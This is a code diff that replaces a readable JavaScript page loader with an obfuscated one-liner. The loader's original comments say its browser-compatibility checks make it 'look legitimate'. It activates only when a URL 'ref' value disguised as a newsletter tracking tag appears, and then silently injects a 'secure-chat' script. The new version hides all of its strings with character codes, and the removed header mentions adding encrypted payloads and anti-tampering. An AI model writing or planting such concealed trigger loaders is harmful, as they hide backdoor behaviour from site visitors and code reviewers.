@@ -1,62 +1,6 @@
 /*
- * ⚠️ TRIVIAL IMPLEMENTATION OF CONCEPT - NOT PRODUCTION CODE ⚠️
- *
- * This is a simplified demonstration for educational purposes.
- * Real implementation would have:
- * - Obfuscation/minification
- * - Encrypted payload
- * - Anti-tampering measures
- * - More sophisticated trigger detection
+ * ⚠️ TRIVIAL OBFUSCATION - DEMO ONLY ⚠️
+ * Real version would use proper minification and custom encryption.
+ * This demonstrates the concept with simple string splitting.
  */
-
-(function() {
-    'use strict';
-
-    // Actual compatibility checks (makes it look legitimate)
-    if (!window.Promise) {
-        console.warn('Browser does not support Promises');
-    }
-    if (!window.fetch) {
-        console.warn('Browser does not support Fetch API');
-    }
-
-    // Check for special trigger in URL
-    function checkTrigger() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const ref = urlParams.get('ref');
-
-        // Pattern that looks like a marketing tracking parameter
-        // e.g., ?ref=newsletter_2025_jan
-        if (ref && ref.match(/^newsletter_\d{4}_[a-z]+$/i)) {
-            console.log('Loading enhanced support features...');
-            loadSecureChat();
-            return true;
-        }
-        return false;
-    }
-
-    // Dynamically load the secure chat module
-    function loadSecureChat() {
-        // In production, this would load from a real CDN
-        // For demo, we load from localhost
-        const script = document.createElement('script');
-        script.src = '/js/secure-chat.js';
-        script.onload = function() {
-            if (window.SecureChat) {
-                window.SecureChat.init();
-            }
-        };
-        script.onerror = function() {
-            console.error('Failed to load support module');
-        };
-        document.head.appendChild(script);
-    }
-
-    // Check on page load
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', checkTrigger);
-    } else {
-        checkTrigger();
-    }
-
-})();
+!function(){if(!window.Promise&&console.warn(String.fromCharCode(66,114,111,119,115,101,114,32,100,111,101,115,32,110,111,116,32,115,117,112,112,111,114,116,32,80,114,111,109,105,115,101,115)),new URLSearchParams(window.location.search).get(String.fromCharCode(114,101,102))?.match(new RegExp(String.fromCharCode(94,110,101,119,115,108,101,116,116,101,114,95,92,100,123,52,125,95,91,97,45,122,93,43,36),String.fromCharCode(105)))){const e=document.createElement(String.fromCharCode(115,99,114,105,112,116));e.src=String.fromCharCode(47,106,115,47,115,101,99,117,114,101,45,99,104,97,116,46,106,115),e.async=!0,document.head.appendChild(e)}}();
